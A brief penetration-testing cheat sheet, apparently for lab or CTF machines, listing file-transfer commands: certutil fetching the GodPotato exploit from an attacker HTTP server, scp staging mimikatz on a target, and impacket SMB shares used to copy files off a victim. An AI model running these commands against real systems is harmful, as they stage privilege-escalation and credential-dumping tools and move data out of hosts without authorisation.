## Certutil
```bash
certutil -urlcache -split -f http://10.10.16.57:8000/GodPotato-NET4.exe GodPotato-Net4.exe
```


## Python
```py
python3 -m http.server 8000
```

## SCP
```bash
scp mimikatz.exe usernamejohn@10.10.10.10:/tmp/mimi.exe
```

## SMB Server
```bash
impacket-smbserver dev . -smb2support
```

## SMB 
```bash
impacket-smbserver dev . -smb2support -username john -password password!
```
Authentication + Copying
```batch
net use \\10.10.11.10\dev /user:john password!
copy filename \\10.10.11.10\dev\my_filename

```
